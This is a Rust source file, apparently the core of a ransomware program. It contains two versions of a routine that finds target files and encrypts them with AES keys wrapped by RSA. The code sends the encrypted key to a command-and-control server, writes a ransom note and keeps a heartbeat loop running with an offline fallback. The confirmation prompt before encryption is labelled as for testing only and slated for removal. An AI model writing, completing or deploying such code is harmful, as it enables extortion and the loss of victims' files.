use std::io::{self, Write};
use std::time::Duration;
use local_ip_address::local_ip;
use zeroize::Zeroize;
use std::sync::Arc;
use tokio::sync::{Mutex, mpsc};


use crate::core::agent_state::AgentState;
use crate::utils::{logger, note, config::AppConfig};
use crate::core::targeting;
use crate::post::{
    command_handler,
    commands::{AgentCommand, ResultQueue}
};
use crate::crypto::encryption;
use crate::communication::beacon_tcp;


pub async fn _ransom2(logger: Arc<logger::Logger>, config: &AppConfig) -> Result<(), Box<dyn std::error::Error>> {
    logger.init_file_logging(&config.log_path)?; // Change later
    
    let local_ip = local_ip()?;
    logger.log(&format!("Ransomware Program starting on local IP: {}", local_ip));

    // Step 1: Locate files of interest, set path to search
    let targets = targeting::discover_files(&logger, &config.target_path)?;

    dbg!(&targets);
    // Ask user if wants to continue: only for testing purposes, remove later
    if !ask_user_confirmation() {
        logger.log("User chose not to continue. Exiting...");
        return Ok(());
    }

    // Step 2: Encrypt files
    match encryption::_encrypt_old(targets, &logger, &config.extension, &config.key_path) {
        Ok(_) => {},
        Err(e) => logger.log(&format!("Error during encryption: {}", e)),
    }

    // Step 3: Display ransom note with instructions, place on Desktop (TODO)
    let _ = note::generate_note(&logger, &config.note_path);


    // Step 4: Send initial beacon to C2
    let result_queue: ResultQueue = Arc::new(Mutex::new(None));
    let (agent_id, session_id) = beacon_tcp::initial_beacon(
        &config.server_address, 
        config.retries, 
        config.timeout_seconds,
        &logger,
        &Vec::new()).await;

    
    let offline = agent_id == 0;

    // Create a channel for commands
    let (tx, rx) = mpsc::channel::<AgentCommand>(32);
    // Start worker
    tokio::spawn(command_handler::run_command_worker(rx, Arc::clone(&result_queue)));

    
    let mut agent_state = AgentState {
        agent_id,
        session_id,
        offline,
        logger: Arc::clone(&logger),
        result_queue,
        tx,
        heartbeat_handle: None
    };
    
    // Run heartbeat loop forever. If no response from server, switch to offline mode until reconnected
    loop {
        if !agent_state.offline {
            if agent_state.heartbeat_handle.is_none() {
                // Only spawn if not already running
                agent_state.heartbeat_handle = Some(agent_state.start_heartbeat(config));
            }
        
            // Check if the task is done
            if let Some(handle) = agent_state.heartbeat_handle.take() {
                match handle.await {
                    Ok(Ok(())) => {} // still good
                    Ok(Err(e)) => {
                        logger.log(&format!("Heartbeat error: {e}"));
                        agent_state.offline = true;
                    }
                    Err(e) => {
                        logger.log(&format!("Task panic: {e}"));
                        agent_state.offline = true;
                    }
                }
            }
            tokio::time::sleep(Duration::from_secs(5)).await;
        } else {
            agent_state.offline_mode(config).await;
            agent_state.offline = false;
            tokio::time::sleep(Duration::from_secs(5)).await;
        }
    }

}

pub async fn ransom(logger: Arc<logger::Logger>, config: &AppConfig) -> Result<(), Box<dyn std::error::Error>> {
    logger.init_file_logging(&config.log_path)?; // Change later
    
    let local_ip = local_ip()?;
    logger.log(&format!("Ransomware Program starting on local IP: {}", local_ip));

    // Step 1: Locate files of interest, set path to search
    let targets = targeting::discover_files(&logger, &config.target_path)?;
    dbg!(&targets);

    // Step 2: Generate keys
    let public_key_path = "src/crypto/public.pem"; // FIX: add to config file or retrieve from online server?
    let (mut aes_key, mut aes_iv, encrypted_key) = match encryption::prepare_encryption_keys(public_key_path) {
        Ok((key, iv, encrypted)) => (key, iv, encrypted),
        Err(e) => {
            logger.error(&format!("Failed to prepare encryption keys: {}", e));
            return Err(e);
        }
    };

    // Create result queue
    let result_queue: ResultQueue = Arc::new(Mutex::new(None));
    // Create a channel for commands
    let (tx, rx) = mpsc::channel::<AgentCommand>(32);
    // Start worker
    tokio::spawn(command_handler::run_command_worker(rx, Arc::clone(&result_queue)));

    // Initialize AgentState
    let mut agent_state = AgentState {
        agent_id: 0,
        session_id: "test".to_string(),
        offline: true,
        logger: Arc::clone(&logger),
        result_queue,
        tx,
        heartbeat_handle: None
    };
    
    
    // Step 3: Connect to C2 server and send encryption key
    let (agent_id, session_id) = beacon_tcp::initial_beacon(
        &config.server_address, 
        config.retries, 
        config.timeout_seconds,
        &logger,
        &encrypted_key).await;

    // If unable to connect, enter offline mode until able to reestablish connection
    if agent_id == 0 {
        agent_state.offline_mode_key(config, encrypted_key).await;
    } else {
        agent_state.agent_id = agent_id;
        agent_state.session_id = session_id;
        agent_state.offline = false;
    }

    
    // Ask user if wants to continue: only for testing purposes, remove later
    if !ask_user_confirmation() {
        logger.log("User chose not to continue. Exiting...");
        return Ok(());
    }

    // Step 4: Encrypt files
    match encryption::encrypt(targets, &logger, &config.extension, aes_key, aes_iv) {
        Ok(_) => {},
        Err(e) => logger.log(&format!("Error during encryption: {}", e)),
    }

    // Wipe AES key from memory
    aes_key.zeroize();
    aes_iv.zeroize();
    
    // Step 5: Display ransom note  TODO: place on Desktop
    let _ = note::generate_note(&logger, &config.note_path);

    // Step 6 Run heartbeat loop forever. If no response from server, switch to offline mode until reconnected
    loop {
        if !agent_state.offline {
            if agent_state.heartbeat_handle.is_none() {
                // Only spawn if not already running
                agent_state.heartbeat_handle = Some(agent_state.start_heartbeat(config));
            }
        
            // Check if the task is done
            if let Some(handle) = agent_state.heartbeat_handle.take() {
                match handle.await {
                    Ok(Ok(())) => {} // still good
                    Ok(Err(e)) => {
                        logger.log(&format!("Heartbeat error: {e}"));
                        agent_state.offline = true;
                    }
                    Err(e) => {
                        logger.log(&format!("Task panic: {e}"));
                        agent_state.offline = true;
                    }
                }
            }
            tokio::time::sleep(Duration::from_secs(5)).await;
        } else {
            agent_state.offline_mode(config).await;
            agent_state.offline = false;
            tokio::time::sleep(Duration::from_secs(5)).await;
        }
    }
    
}

fn ask_user_confirmation() -> bool {
    print!("Do you want to begin encrypting? (y/n): ");
    io::stdout().flush().unwrap();

    let mut input = String::new();
    io::stdin().read_line(&mut input).unwrap();
    matches!(input.trim().to_lowercase().as_str(), "y" | "yes")
}

